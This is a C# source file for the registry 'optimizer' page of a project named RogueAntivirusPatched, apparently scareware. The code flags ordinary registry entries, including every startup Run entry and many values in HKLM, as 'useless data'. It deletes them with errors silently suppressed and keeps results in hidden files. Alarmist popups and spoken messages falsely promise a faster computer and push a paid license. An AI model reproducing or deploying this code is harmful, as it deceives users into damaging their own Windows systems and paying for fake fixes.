using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using RogueAntivirusPatched.Model;
using RogueAntivirusPatched.ViewModel;
using Microsoft.Win32;
using System.IO;
using System.Collections.ObjectModel;
using System.Drawing;
using RogueAntivirusPatched.Global;
using System.ComponentModel;
using System.Windows.Markup;
using RogueAntivirusPatched.Advertisement;
using System.Threading;
using System.Globalization;
using RogueAntivirusPatched.View.Windows;

namespace RogueAntivirusPatched.View.Pages
{
    /// <summary>
    /// Interaction logic for RegistryPage.xaml
    /// </summary>
    public partial class RegistryPage : Page
    {
        private string nothing = "No values and keys found";
        private string defaultValue = "(Default Value)";
        private vmRegistry _vmRegistry;
        private KeySender keySender;
        private RandomAd ads;
        private bool isOnLoad = false;
        private Events events;
        private MouseButtonEventArgs args;

        private string[] roots =
        {
                @"HKEY_CLASSES_ROOT\",
                @"HKEY_CURRENT_USER\",
                @"HKEY_LOCAL_MACHINE\",
                @"HKEY_USERS\",
                @"HKEY_CURRENT_CONFIG\",
        };

        public class RegistryData
        {
            public const string Issue = Variables.RogueBaseDir + "\\" + "regIssue.txt";
            public const string Data = Variables.RogueBaseDir + "\\" + "regData.txt";
            public const string RegistryKey = Variables.RogueBaseDir + "\\" + "regKey.txt";
        }

        public RegistryPage(bool immediateScan = false)
        {
            InitializeComponent();
            _vmRegistry = new vmRegistry();
            DataContext = _vmRegistry;
            keySender = new KeySender();
            ads = new RandomAd();
            events = new Events();

            events.popUpPublisher.popUpHandler += PopUpPublisher_popUpHandler;

            if (!immediateScan)
                return;

            if (Variables.IsPageWorking)
                return;

            args = new MouseButtonEventArgs(Mouse.PrimaryDevice, Environment.TickCount, MouseButton.Left)
            {
                RoutedEvent = MouseLeftButtonDownEvent
            };

            AnalyzeBtn_Click(this, args);
        }

        private void PopUpPublisher_popUpHandler(object sender, Events.PopUpArgs e)
        {
            if (Variables.IsPageWorking)
                return;

            if (Variables.PayloadsRunning || Variables.KeystrokeTriggerRunning)
                return;

            switch (e.popUpType)
            {
                case Events.PopUpArgs.PopUpType.RegLoaded:
                    RemoveBtn_Click(this, args);
                    break;

                case Events.PopUpArgs.PopUpType.RegAnalyzeComplete:
                    RemoveBtn_Click(this, args);
                    break;
            }
        }

        private void Page_Loaded(object sender, RoutedEventArgs e)
        {
            RegistryGrid.Columns[0].Header = "";
            RegistryGrid.Columns[1].Header = " Issues";
            RegistryGrid.Columns[2].Header = " Data";
            RegistryGrid.Columns[3].Header = " Registry Keys";

            RegistryGrid.Columns[1].Width = 150;
            RegistryGrid.Columns[2].Width = 250;
            RegistryGrid.Columns[3].Width = 300;

            RegistryGrid.Columns[0].IsReadOnly = false;
            RegistryGrid.Columns[1].IsReadOnly = true;
            RegistryGrid.Columns[2].IsReadOnly = true;
            RegistryGrid.Columns[3].IsReadOnly = true;

            var checkBoxStyle = (Style)FindResource("CustomCheckBoxStyle");

            if (RegistryGrid.Columns[0] is DataGridCheckBoxColumn checkBoxColumn)
            {
                checkBoxColumn.ElementStyle = checkBoxStyle;
                checkBoxColumn.EditingElementStyle = checkBoxStyle;
            }

            RegistryGrid.Columns[0].Width = 35;

            LoadRegData();
        }

        private async void AnalyzeBtn_Click(object sender, MouseButtonEventArgs e)
        {
            _vmRegistry.ToggleButtons = false;
            isOnLoad = false;
            CleanRegData();
            Variables.IsPageWorking = true;

            _vmRegistry.AboutProgress = "Analyzing ...";
            _vmRegistry.CanAnalyze = false;
            _vmRegistry.CanRemove = false;

            TTS.SpeakInterrupted(TTS.TTSProperty.RegistryOptimizer.searching);

            int tickedBoxes = GetTickedBoxesAmmount();

            ClearGrid();

            var registryFunctions = new Action[] 
            {
                SetUpUselessRegistry,
                SharedDll,
                AppPaths,
                UnusedFileExtensions,
                Uninstaller,
                StartUpApps
            };

            string preMessage = "Searching for ";

            var task = Task.Run(() => 
            {
                foreach (var regFunc in registryFunctions)
                {
                    if (Variables.PayloadsRunning || Variables.KeystrokeTriggerRunning)
                        return;

                    regFunc();
                    IncreaseBar(tickedBoxes);

                    if (regFunc == SetUpUselessRegistry)
                        _vmRegistry.ProgressDetails = preMessage + _vmRegistry.ContentEmptyData;

                    if (regFunc == SharedDll)
                        _vmRegistry.ProgressDetails = preMessage + _vmRegistry.ContentSharedDll;

                    if (regFunc == AppPaths)
                        _vmRegistry.ProgressDetails = preMessage + _vmRegistry.ContentAppPaths;

                    if (regFunc == UnusedFileExtensions)
                        _vmRegistry.ProgressDetails = preMessage + _vmRegistry.ContentUnused;

                    if (regFunc == Uninstaller)
                        _vmRegistry.ProgressDetails = preMessage + _vmRegistry.ContentInvalidUninstaller;

                    if (regFunc == StartUpApps)
                        _vmRegistry.ProgressDetails = preMessage + _vmRegistry.ContentRunAtStart;
                }
            });

            await task;

            Variables.IsPageWorking = false;

            AnalyzeComplete();
            StoreRegData();
        }

        private void AnalyzeComplete()
        {
            _vmRegistry.ToggleButtons = true;
            _vmRegistry.CanRemove = true;
            _vmRegistry.CanAnalyze = true;
            _vmRegistry.AboutProgress = "Analysis is Completed!";

            if (_vmRegistry.RegistryInfo.Count == 0)
            {
                string title = "Alert";
                string subTitle = "Your computer is clean";
                string text = "Analysis revealed that your registry is completely clean and" +
                    " without any unused data!" + Environment.NewLine +
                    "However, this does not mean that it will always end up like that. " +
                    "It is recommended to search for these data at least every week and " +
                    "especially when it comes to installing new software.";
                var bitmap = Properties.Resources.sparks;
                var margin = new Thickness(0, 0, 0, 80);
                int width = 500;
                int height = 450;
                var sound = Properties.Resources.success;
                events.ShowPopUp(Events.PopUpArgs.PopUpType.RegNotFound, title, subTitle, text, bitmap, margin, width, height, sound);

                TTS.SpeakInterrupted(TTS.TTSProperty.RegistryOptimizer.nothingFound);
                _vmRegistry.CanRemove = false;
                _vmRegistry.ProgressDetails = TTS.TTSProperty.RegistryOptimizer.nothingFound;
            }
            else
            {
                int rowCount = _vmRegistry.RegistryInfo.Count;
                _vmRegistry.CanRemove = true;
                _vmRegistry.ProgressDetails = "We have found " + rowCount + " unnecessary " +
                    "registry data!" + Environment.NewLine +
                    "Now you can remove all selected files by clicking on \"Remove\" button.";

                if (!isOnLoad) 
                {
                    string title = "Alert";
                    string subTitle = "Unnecessary registry data found";
                    string text = "Analysis revealed that your registry is filled with a bunch of useless " +
                        "registry data. These data may slow down your computer and make the registry very unorganized." +
                        Environment.NewLine + "We are highly recommending removing these data!";
                    var bitmap = Properties.Resources.rubbish;
                    var margin = new Thickness(0, 0, 0, 70);
                    var sound = Properties.Resources.alert;
                    var btn1Content = "Remove";
                    var btn2Content = "Later";
                    events.ShowPopUp(Events.PopUpArgs.PopUpType.RegAnalyzeComplete, title, subTitle, text, bitmap, margin, 500, 400, sound, btn1Content, btn2Content);

                    TTS.SpeakInterrupted(TTS.TTSProperty.RegistryOptimizer.dataFound +
                        rowCount + " unnecessary registry data!");
                }
            }

            _vmRegistry.ProgressBarValue = 0;
            _vmRegistry.ProgressBarContent = "0%";
        }

        private int GetTickedBoxesAmmount()
        {
            int counter = 0;
            bool[] boxesTicedBool =
            {
                _vmRegistry.IsEmptyData,
                _vmRegistry.IsAppPaths,
                _vmRegistry.IsInvalidUninstaller,
                _vmRegistry.IsRunAtStart,
                _vmRegistry.IsSharedDll,
                _vmRegistry.IsUnused
            };

            foreach (bool box in boxesTicedBool)
            {
                if (box)
                    counter += 1;
            }

            return counter;
        }

        private void IncreaseBar(int tickedBoxesAmount)
        {
            double one = (1.0 / tickedBoxesAmount) * 100;

            _vmRegistry.ProgressBarValue += one;
            _vmRegistry.ProgressBarContent = Math.Round(_vmRegistry.ProgressBarValue).ToString() + "%";
        }

        private void RemoveBtn_Click(object sender, MouseButtonEventArgs e)
        {
            Variables.IsPageWorking = true;
            _vmRegistry.ProgressBarValue = 0.0;
            _vmRegistry.ProgressBarContent = "0%";
            _vmRegistry.AboutProgress = TTS.TTSProperty.RegistryOptimizer.onRemoving + " ...";
            _vmRegistry.CanAnalyze = false;
            _vmRegistry.CanRemove = false;
            _vmRegistry.ToggleButtons = false;

            TTS.SpeakInterrupted(TTS.TTSProperty.RegistryOptimizer.onRemoving);

            Task.Run(() => RemoveRegistyData());
        }

        private async Task RemoveRegistyData()
        {
            int attemptRemove = 0;
            int removed = 0;
            string percentage = "";
            double barValue = 0;

            await Task.Run(() =>
            {
                for (int i = 0; i < _vmRegistry.RegistryInfo.Count; i++)
                {
                    if (!_vmRegistry.RegistryInfo[i].SeletectedData)
                    {
                        Application.Current.Dispatcher.Invoke(() => _vmRegistry.RegistryInfo.RemoveAt(i));
                        i -= 1;
                    }
                }

                int regInfoCount = _vmRegistry.RegistryInfo.Count;
                double onePercent = (1.0 / regInfoCount) * 100.0;

                for (int i = 0; i < regInfoCount; i++)
                {
                    if (Variables.PayloadsRunning || Variables.KeystrokeTriggerRunning)
                        return;

                    attemptRemove += 1;

                    Application.Current.Dispatcher.Invoke(() => {
                        _vmRegistry.ProgressDetails = _vmRegistry.RegistryInfo[0].RegistryKey;
                    });

                    string key = _vmRegistry.RegistryInfo[0].RegistryKey;
                    string data = _vmRegistry.RegistryInfo[0].Data;

                    RegistryHive hive = DetermineHive(key);

                    string rootLessKey = RemoveRoot(key);

                    string parrentKey = GetParrentKey(rootLessKey);

                    string justSubKeyName = GetSubKeyNameOnly(rootLessKey);

                    using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64))
                    {
                        try
                        {
                            using (RegistryKey regKey = baseKey.OpenSubKey(parrentKey, true))
                            {
                                if (data == nothing)
                                {
                                    regKey.DeleteValue(justSubKeyName);
                                    removed += 1;
                                }
                                else
                                {
                                    if (regKey != null)
                                    {
                                        using (RegistryKey subKey = regKey.OpenSubKey(justSubKeyName, true))
                                        {
                                            if (data == defaultValue)
                                            {
                                                subKey.DeleteValue("");
                                                removed += 1;
                                            }
                                            else
                                            {
                                                subKey.DeleteValue(data);
                                                removed += 1;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        barValue += onePercent;
                        percentage = Math.Round(barValue).ToString();
                        _vmRegistry.ProgressBarValue = barValue;
                        _vmRegistry.ProgressBarContent = percentage + "%";
                        _vmRegistry.RegistryInfo.RemoveAt(0);
                    });
                }
            });

            CleanRegData();
            Variables.IsPageWorking = false;
            barValue = 0;
            percentage = "0%";
            _vmRegistry.ToggleButtons = true;
            _vmRegistry.ProgressBarValue = barValue;
            _vmRegistry.ProgressBarContent = percentage;
            _vmRegistry.AboutProgress = "Attempt to remove " + attemptRemove.ToString() + " values";
            _vmRegistry.ProgressDetails = "Successfully deleted: " + removed.ToString() + " | " + "Failed: " + (attemptRemove - removed).ToString();
            _vmRegistry.CanAnalyze = true;
            _vmRegistry.CanRemove = false;

            string title = "Alert";
            string subTitle = "Useless data has been removed";
            string text = "We have successfully removed " + removed.ToString() + " registry data. " +
                "From this moment your computer is faster and more stable!" + Environment.NewLine +
                "Data that could not be deleted are probably protected by the system. We left them there " +
                "due to security reasons.";
            var bitmap = Properties.Resources.computer_cleaning;
            var margin = new Thickness(0, 0, 0, 60);
            var sound = Properties.Resources.success;
            events.ShowPopUp(Events.PopUpArgs.PopUpType.RegRemoved, title, subTitle, text, bitmap, margin, 500, 400, sound);

            TTS.SpeakInterrupted(TTS.TTSProperty.RegistryOptimizer.success + removed.ToString() + " registry data.");
        }

        private RegistryHive DetermineHive(string key)
        {
            RegistryHive hive = RegistryHive.ClassesRoot;

            if (key.StartsWith(roots[0]))
                hive = RegistryHive.ClassesRoot;
            if (key.StartsWith(roots[1]))
                hive = RegistryHive.CurrentUser;
            if (key.StartsWith(roots[2]))
                hive = RegistryHive.LocalMachine;
            if (key.StartsWith(roots[3]))
                hive = RegistryHive.Users;
            if (key.StartsWith(roots[4]))
                hive = RegistryHive.CurrentConfig;

            return hive;
        }

        private string RemoveRoot(string key)
        {
            string currentKey = key;

            foreach (string root in roots)
            {
                if (key.StartsWith(root))
                    currentKey = key.Replace(root, "");
            }

            return currentKey;
        }

        private string GetParrentKey(string key)
        {
            if (!key.Contains(@"\"))
                return "";

            string parrentKey = key;

            int lastChar = parrentKey.LastIndexOf('\\');

            if (lastChar >= 0)
                parrentKey = parrentKey.Substring(0, lastChar);

            return parrentKey;
        }

        private string GetSubKeyNameOnly(string key)
        {
            if (!key.Contains("\\"))
                return key;

            string keyName = key;

            int lastChar = keyName.LastIndexOf("\\");

            if (lastChar >= 0)
                keyName = keyName.Substring(lastChar + 1);

            return keyName;
        }

        private void SharedDll()
        {
            if (!_vmRegistry.IsSharedDll)
                return;

            string[] registryArchitecture =
        {
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\SharedDlls",
                @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\SharedDlls"
            };

            RegistryHive hive = RegistryHive.LocalMachine;

            foreach (string registryArch in registryArchitecture)
            {
                using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64))
                {
                    using (RegistryKey regKey = baseKey.OpenSubKey(registryArch, false))
                    {
                        string regKeyName = regKey.Name;

                        var regTools = new RegistryTools();

                        List<string> invalidApps = regTools.GetInvalidApplications(regKey);

                        foreach (string app in invalidApps)
                        {
                            AddStuffToGrid(true, _vmRegistry.ContentSharedDll, app, regKeyName);
                        }
                    }
                }
            }
        }

        private void AppPaths()
        {
            if (!_vmRegistry.IsAppPaths)
                return;

            string registryKeyPath = @"Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store";

            using (RegistryKey regKey = Registry.CurrentUser.OpenSubKey(registryKeyPath))
            {
                string regKeyName = regKey.Name;

                var regTools = new RegistryTools();
                List<string> invalidApps = regTools.GetInvalidApplications(regKey);

                foreach (string app in invalidApps)
                {
                    AddStuffToGrid(true, _vmRegistry.ContentAppPaths, app, regKeyName);
                }
            }
        }

        private void UnusedFileExtensions()
        {
            if (!_vmRegistry.IsUnused)
                return;

            string registryKeyPath = @"SOFTWARE\Classes";

            var regTools = new RegistryTools();

            List<string> listKey = regTools.GetAllSubKeys(RegistryHive.LocalMachine, RegistryView.Registry64, registryKeyPath);

            foreach (string key in listKey)
            {
                using (RegistryKey _regKey = Registry.LocalMachine.OpenSubKey(registryKeyPath + @"\" + key))
                {
                    if (_regKey != null)
                    {
                        if (_regKey.SubKeyCount == 0 && _regKey.ValueCount == 0)
                        {
                            AddStuffToGrid(true, _vmRegistry.ContentUnused, nothing, _regKey.Name);
                        }
                    }
                }
            }
        }

        private void Uninstaller()
        {
            if (!_vmRegistry.IsInvalidUninstaller)
                return;

            var regTools = new RegistryTools();

            string[] registryArchitecture = {
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
                };

            List<string> listKey = regTools.GetAllSubKeys(RegistryHive.LocalMachine, RegistryView.Registry64, registryArchitecture[0]);

            foreach (string registryArch in registryArchitecture)
            {
                foreach (string key in listKey)
                {
                    using (RegistryKey baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                    {
                        using (RegistryKey regKey = baseKey.OpenSubKey(registryArch + @"\" + key, false))
                        {
                            if (regKey == null)
                                continue;
                            bool isKeyEmpty = regTools.IsRegistryKeyEmpty(regKey);
                            if (isKeyEmpty)
                            {
                                AddStuffToGrid(true, _vmRegistry.ContentInvalidUninstaller, nothing, regKey.Name);
                            }

                            string[] values = regKey.GetValueNames();

                            bool isInvalid = IsInvalidUninstaller(values);

                            if (isInvalid && !isKeyEmpty)
                            {
                                AddStuffToGrid(true, _vmRegistry.ContentInvalidUninstaller, "Corrupted", regKey.Name);
                            }
                        }
                    }
                }
            }
        }

        private bool IsInvalidUninstaller(string[] values)
        {
            if (values == null || values.Length == 0)
                return false;

            foreach (string value in values)
            {
                if (value == "DisplayName")
                    return false;
                if (value == "SystemComponent")
                    return false;
                if (value == "UninstallString")
                    return false;
            }

            return true;
        }

        private void SetUpUselessRegistry()
        {
            if (!_vmRegistry.IsEmptyData)
                return;

            RegistryHive[] hives =
            {
                RegistryHive.CurrentUser,
                RegistryHive.LocalMachine,
                RegistryHive.Users,
                RegistryHive.PerformanceData,
                RegistryHive.DynData,
                RegistryHive.CurrentConfig
            };

            var regTools = new RegistryTools();

            if (_vmRegistry.IsAdvanced)
            {
                foreach (var hive in hives)
                {
                    var list = regTools.GetAllSubKeys(hive, RegistryView.Registry64, "");
                    UselessRegistry(list, hive, null);
                }
            }
            else
            {
                var list = regTools.GetAllSubKeys(RegistryHive.CurrentUser, RegistryView.Registry64, "Software");
                UselessRegistry(list, RegistryHive.CurrentUser, @"Software\");
            }
        }

        private void UselessRegistry(List<string> ListKey, RegistryHive hive, string targetKey)
        {
            if (!_vmRegistry.IsEmptyData)
                return;

            if (targetKey == null)
                targetKey = string.Empty;

            var regTools = new RegistryTools();

            List<string> emptyValues = new List<string>();

            int emptyKeys = 0;

            var listKey = ListKey;

            foreach (string key in listKey)
            {

                using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64))
                {
                    try
                    {
                        using (RegistryKey regKey = baseKey.OpenSubKey(targetKey + key, false))
                        {
                            if (regKey == null)
                                continue;

                            string regKeyName = regKey.Name;

                            //Search for empty keys with no values and data
                            bool isKeyEmpty = regTools.IsRegistryKeyEmpty(regKey);
                            if (isKeyEmpty)
                            {
                                emptyKeys += 1;
                                AddStuffToGrid(true, _vmRegistry.ContentEmptyData, nothing, regKey.Name);
                            }
                            //Search for values with no data
                            List<string> tempEmptyValues = IsRegistryValueEmpty(regKey);
                            foreach (string value in tempEmptyValues)
                            {
                                string valueName = value;

                                if (string.IsNullOrWhiteSpace(valueName))
                                    valueName = defaultValue;
                                emptyValues.Add(valueName);

                                AddStuffToGrid(true, _vmRegistry.ContentEmptyData, valueName, regKeyName);
                            }
                        }
                    }
                    catch { }
                }
            }
        }

        private void ClearGrid()
        {
            if (_vmRegistry.RegistryInfo.Count != 0)
                _vmRegistry.RegistryInfo.Clear();
        }

        private void StoreRegData()
        {
            if (_vmRegistry.RegistryInfo.Count == 0)
                return;

            var files = ClassToArray();

            var regInfoLenght = _vmRegistry.RegistryInfo.Count;

            foreach (var file in files)
            {
                for (int i = 1; i < regInfoLenght; i++)
                {
                    string line = "";

                    if (file == RegistryData.Issue) { line = _vmRegistry.RegistryInfo[i].Issue; }
                    if (file == RegistryData.Data) { line = _vmRegistry.RegistryInfo[i].Data; }
                    if (file == RegistryData.RegistryKey) { line = _vmRegistry.RegistryInfo[i].RegistryKey; }

                    using (var sw = new StreamWriter(file, true))
                    {
                        sw.WriteLine(line);
                    }

                    if (File.Exists(file))
                        File.SetAttributes(file, FileAttributes.Hidden);
                }
            }
        }

        private void AddStuffToGrid(bool selected, string issue, string data, string registryKey)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                _vmRegistry.RegistryInfo.Add(new mRegistry
                {
                    SeletectedData = selected,
                    Issue = issue,
                    Data = data,
                    RegistryKey = registryKey
                });
            });
        }

        private bool CanUseFile(string file)
        {
            try
            {
                var stream = new FileStream(file, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
                return true;
            }
            catch 
            {
                return false;
            }
        }

        private void CleanRegData()
        {
            var list = ClassToArray();

            foreach (var file in list)
            {
                if (File.Exists(file))
                    File.Delete(file);
            }
        }

        private async void LoadRegData()
        {
            var regFiles = ClassToArray();

            foreach (string file in regFiles)
            {
                if (!File.Exists(file))
                    return;
            }

            string title = "Alert";
            string subTitle = "Unnecessary Registry Data Found";
            string text = "The computer is still flooded with some useless registry data." + Environment.NewLine +
                "Remove detected data to make the registry more organized and get better performance!";
            var margin = new Thickness(0, 0, 0, 80);
            var sound = Properties.Resources.alert;
            var btn1Content = "Remove";
            var btn2Content = "Later";
            events.ShowPopUp(Events.PopUpArgs.PopUpType.RegLoaded, title, subTitle, text, Properties.Resources.sweep, margin, 500, 400, sound, btn1Content, btn2Content);

            TTS.SpeakInterrupted(TTS.TTSProperty.RegistryOptimizer.onLoad);
            _vmRegistry.AboutProgress = Variables.gatheringData;
            _vmRegistry.CanAnalyze = false;
            _vmRegistry.CanRemove = false;

            await Task.Run(async() => 
            {
                isOnLoad = true;
                string[] fileRegistryKey = File.ReadAllLines(RegistryData.RegistryKey);
                string[] fileIssue = File.ReadAllLines(RegistryData.Issue);
                string[] fileData = File.ReadAllLines(RegistryData.Data);

                for (int i = 0; i < fileRegistryKey.Length; i++)
                {
                    Application.Current.Dispatcher.Invoke(() => 
                    {
                        _vmRegistry.RegistryInfo.Add(new mRegistry
                        {
                            SeletectedData = true,
                            Issue = fileIssue[i],
                            Data = fileData[i],
                            RegistryKey = fileRegistryKey[i]
                        });
                    });
                    await Task.Delay(1);
                }

                AnalyzeComplete();
            });
        }

        private List<string> ClassToArray()
        {
            var list = new List<string>();
            var regData = new RegistryData();

            foreach (var item in regData.GetType().GetFields())
            {
                if (item.FieldType == typeof(string))
                {
                    string data = item.GetValue(regData) as string;
                    list.Add(data);
                }
            }

            return list;
        }

        private List<string> IsRegistryValueEmpty(RegistryKey regKey)
        {
            List<string> collector = new List<string>();
            //Ignore keys with default value which doesn't contains any data
            if (regKey.ValueCount == 0)
                return collector;

            string[] values = regKey.GetValueNames();

            foreach (string value in values)
            {
                object data = regKey.GetValue(value);

                if (data == null)
                    continue;

                if (string.IsNullOrWhiteSpace(data.ToString()))
                {
                    collector.Add(value.ToString());
                }
            }

            return collector;
        }

        private void StartUpApps() 
        {
            if (!_vmRegistry.IsRunAtStart)
                return;

            string[] registryKeyPaths =
            {
                    @"Software\Microsoft\Windows\CurrentVersion\Run",
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    @"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
                };

            List<RegistryHive> registryHives = new List<RegistryHive>
                {
                    RegistryHive.CurrentUser,
                    RegistryHive.LocalMachine
                };

            List<string> valueCollector = new List<string>();

            foreach (string registryKeyPath in registryKeyPaths)
            {
                RegistryHive hive = registryHives[0];

                if (registryKeyPath.StartsWith("SOFTWARE"))
                    hive = registryHives[1];

                using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64))
                {
                    using (RegistryKey regKey = baseKey.OpenSubKey(registryKeyPath, false))
                    {
                        if (regKey == null)
                            continue;

                        string[] values = regKey.GetValueNames();

                        foreach (string value in values)
                        {
                            string valueName = value;

                            if (string.IsNullOrWhiteSpace(valueName))
                                valueName = defaultValue;

                            AddStuffToGrid(true, _vmRegistry.ContentRunAtStart, valueName, regKey.Name);
                        }
                    }
                }
            }
        }

        private void AdvancedBtn_Click(object sender, MouseButtonEventArgs e)
        {
            Task.Run(async () =>
            {
                await Task.Delay(100);
                Application.Current.Dispatcher.Invoke(() =>
                {
                    if (!keySender.HasLicense)
                    {
                        ads.OnlyForPro();
                        _vmRegistry.IsAdvanced = false;
                        _vmRegistry.IsStandard = true;
                        return;
                    }
                });
            });
        }

        private void UnusedBox_Click(object sender, RoutedEventArgs e)
        {
            if (!keySender.HasLicense)
            {
                ads.OnlyForPro();
                _vmRegistry.IsUnused = false;
                return;
            }
        }

        private void InvalidBox_Click(object sender, RoutedEventArgs e)
        {
            if (!keySender.HasLicense)
            {
                ads.OnlyForPro();
                _vmRegistry.IsInvalidUninstaller = false;
                return;
            }
        }

        private void StartupBox_Click(object sender, RoutedEventArgs e)
        {
            if (!keySender.HasLicense)
            {
                ads.OnlyForPro();
                _vmRegistry.IsRunAtStart = false;
                return;
            }
        }
    }

    public class RegistryTools
    {
        public bool Is64Bit(string registryKeyPath, RegistryHive hive)
        {
            using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64))
            {
                using (RegistryKey regKey = baseKey.OpenSubKey(registryKeyPath, false))
                {
                    if (regKey == null)
                        return false;
                }
            }

            return true;
        }
        public List<string> GetInvalidApplications(RegistryKey regKey)
        {
            List<string> listValues = new List<string>();

            if (regKey.ValueCount == 0)
                return listValues;

            using (regKey)
            {
                string[] valueNames = regKey.GetValueNames();

                foreach (string valueName in valueNames)
                {
                    if (!File.Exists(valueName))
                    {
                        listValues.Add(valueName);
                    }
                }
            }

            return listValues;
        }

        static List<string> subKeyCollector = new List<string>();

        public List<string> GetAllSubKeys(RegistryHive hive, RegistryView view, string targetKey)
        {
            subKeyCollector.Clear();

            //Container without targetKey path
            List<string> fixedSubkeys = new List<string>();

            using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, view))
            {
                if (baseKey != null)
                {
                    using (RegistryKey regKey = baseKey.OpenSubKey(targetKey, false))
                    {
                        if (regKey != null)
                        {
                            string[] subkeys = regKey.GetSubKeyNames();
                            foreach (string subkey in subkeys)
                            {
                                subKeyCollector.Add(subkey);
                                TraverseGeAllSubKeys(hive, targetKey, subkey, view);
                            }

                            foreach (string item in subKeyCollector)
                            {
                                string currentItem = item;
                                if (currentItem.Contains(targetKey + @"\") && !string.IsNullOrWhiteSpace(targetKey))
                                    currentItem = currentItem.Replace(targetKey + @"\", "");
                                fixedSubkeys.Add(currentItem);
                            }
                        }
                    }
                }
            }

            return fixedSubkeys;
        }

        private static void TraverseGeAllSubKeys(RegistryHive hive, string mainKey, string regSubKey, RegistryView view)
        {
            using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, view))
            {
                using (RegistryKey _mainKey = baseKey.OpenSubKey(mainKey, false))
                {
                    try
                    {
                        using (RegistryKey _subKey = _mainKey.OpenSubKey(regSubKey, false))
                        {
                            string[] subKeys = _subKey.GetSubKeyNames();
                            foreach (string subKey in subKeys)
                            {
                                if (string.IsNullOrWhiteSpace(mainKey))
                                {
                                    subKeyCollector.Add(regSubKey + @"\" + subKey);
                                    TraverseGeAllSubKeys(hive, regSubKey, subKey, view);
                                }
                                else
                                {
                                    subKeyCollector.Add(mainKey + @"\" + regSubKey + @"\" + subKey);
                                    TraverseGeAllSubKeys(hive, mainKey + @"\" + regSubKey, subKey, view);
                                }
                            }
                        }
                    }
                    catch { }
                }
            }
        }

        //Old crap
        /*
        private static List<string> collectedKeys = new List<string>();
        public List<string> GetAllSubKeysSafely(string keyPath, RegistryHive hive, RegistryView view)
        {
            using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, view))
            {
                if (baseKey != null)
                {
                    using (RegistryKey regKey = baseKey.OpenSubKey(keyPath, false))
                    {
                        if (regKey != null)
                        {
                            string[] keys = regKey.GetSubKeyNames();
                            foreach (string key in keys)
                            {
                                collectedKeys.Add(key);
                                TraverseRegistryKeys(key, hive, view);
                            }
                        }
                    }
                }
            }

            return collectedKeys;
        }

        public static void TraverseRegistryKeys(string keyPath, RegistryHive hive, RegistryView view)
        {
            using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, view))
            {
                if (baseKey != null)
                {
                    using (RegistryKey regKey = baseKey.OpenSubKey(keyPath, false))
                    {
                        if (regKey != null)
                        {
                            string[] keys = regKey.GetSubKeyNames();

                            foreach (string key in keys)
                            {
                                string[] roots = {
                                @"HKEY_CURRENT_USER\",
                                @"HKEY_LOCAL_MACHINE\",
                                @"HKEY_CLASSES_ROOT\",
                                @"HKEY_USERS\",
                                @"HKEY_CURRENT_CONFIG\"
                            };

                                string originalPath = regKey.Name + @"\" + key;
                                string rootLess = "";

                                foreach (string root in roots)
                                {
                                    if (originalPath.Contains(root))
                                        rootLess = originalPath.Replace(root, "");
                                }

                                //I was actually getting null exceptions so that's why I added this :D
                                //Why the fuck somebody would even created roots within a root??? Stupid!
                                //I'm too lazy to fix that bug with having multiple roots in a string
                                try
                                {
                                    using (RegistryKey regExists = baseKey.OpenSubKey(rootLess, false))
                                    {
                                        if (regExists != null)
                                            collectedKeys.Add(rootLess);
                                    }
                                } 
                                catch
                                {
                                    MessageBox.Show(ex.Message);
                                    return;
                                }

                                TraverseRegistryKeys(rootLess, hive, view);
                            }
                        }
                    }
                }
            }
        }*/
        
        public bool IsRegistryKeyEmpty(RegistryKey regKey)
        {
            if (regKey.SubKeyCount == 0 && regKey.ValueCount == 0)
                return true;
            if (regKey.SubKeyCount == 0 && regKey.ValueCount > 0)
            {
                string[] values = regKey.GetValueNames();
                foreach (string value in values)
                {
                    object data = regKey.GetValue(value);

                    if (data == null)
                        continue;

                    if (data != null)
                        return false;
                    if (!string.IsNullOrWhiteSpace(data.ToString()))
                        return false;
                }
                return true;
            }

            return false;
        }
    }
}
